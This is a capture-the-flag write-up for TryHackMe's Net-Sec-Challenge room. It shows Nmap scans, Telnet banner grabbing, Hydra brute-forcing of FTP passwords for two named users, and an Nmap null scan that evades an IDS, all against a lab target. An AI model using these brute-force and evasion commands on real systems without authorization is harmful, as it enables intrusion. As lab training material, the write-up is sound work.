# Net-Sec-Challenge Writeup

This is a formal writeup for the **Net-Sec-Challenge** room on TryHackMe rated as medium. The challenge tests the skills learned in the Network Security module, using tools like **Nmap**, **Telnet**, and **Hydra**. The following sections cover each question and how it was solved.

---

## Question 1

**What is the highest port number being open less than 10,000?**

Command used:

```bash
nmap -p1-10000 <TARGET_IP>
```

Result: The highest port open below 10,000 was **8080 (http-proxy)**.

---

## Question 2

**There is an open port outside the common 1000 ports; it is above 10,000. What is it?**

Command used:

```bash
nmap -p- <TARGET_IP>
```

Result: The open port above 10,000 was **10021**.

---

## Question 3

**How many TCP ports are open?**

Using the same full scan as above (`nmap -p-`), we counted a total of **6 open TCP ports**.

---

## Question 4

**What is the flag hidden in the HTTP server header?**

We connected to port 80 using Telnet:

```bash
telnet <TARGET_IP> 80
```

Then sent a basic HTTP request:

```http
GET / HTTP/1.1
Host: http
```

The server responded with headers that contained the flag.

*Note:* An alternative way would have been using Nmap with service detection:

```bash
nmap -sC -p80 <TARGET_IP>
```

---

## Question 5

**What is the flag hidden in the SSH server header?**

We connected to port 22 using Telnet:

```bash
telnet <TARGET_IP> 22
```

The SSH banner revealed the flag.

*Note:* Similar to Q4, this could also be obtained with:

```bash
nmap -sC -p22 <TARGET_IP>
```

---

## Question 6

**We have an FTP server listening on a nonstandard port. What is the version of the FTP server?**

We ran a service version scan:

```bash
nmap -p- -sV <TARGET_IP>
```

Result: The FTP server was identified as **vsftpd 3.0.5**.

---

## Question 7

**We learned two usernames using social engineering: `eddie` and `quinn`. What is the flag hidden in one of these two account files and accessible via FTP?**

To brute-force the FTP credentials, we used Hydra:

```bash
hydra -l eddie -P /usr/share/wordlists/rockyou.txt ftp://<TARGET_IP>:10021
hydra -l quinn -P /usr/share/wordlists/rockyou.txt ftp://<TARGET_IP>:10021
```

Once valid credentials were found, we logged in:

```bash
ftp <TARGET_IP> 10021
```

After authenticating, one of the accounts contained a file with the hidden flag.

---

## Question 8

**Browsing to http\://\<TARGET\_IP>:8080 displays a small challenge that will give you a flag once you solve it. What is the flag?**

Visiting the page led to a challenge about bypassing an IDS using Nmap. Techniques include decoys (`-D`) or null scans (`-sN`).

In this case, the following worked:

```bash
nmap -sN <TARGET_IP>
```

The scan completed successfully and the page revealed the final flag.

---

## Conclusion

This challenge reinforced fundamental skills in:

* Enumerating services with **Nmap**
* Extracting information from banners with **Telnet**
* Cracking credentials with **Hydra**

## Disclaimer
> ⚠️ This writeup is for educational purposes only. Do not use these techniques outside of authorized environments.
---
* Using FTP clients to retrieve sensitive files
* Understanding IDS evasion with Nmap scan types

The **Net-Sec-Challenge** demonstrates how simple tools can uncover sensitive information if services are misconfigured or use weak credentials.
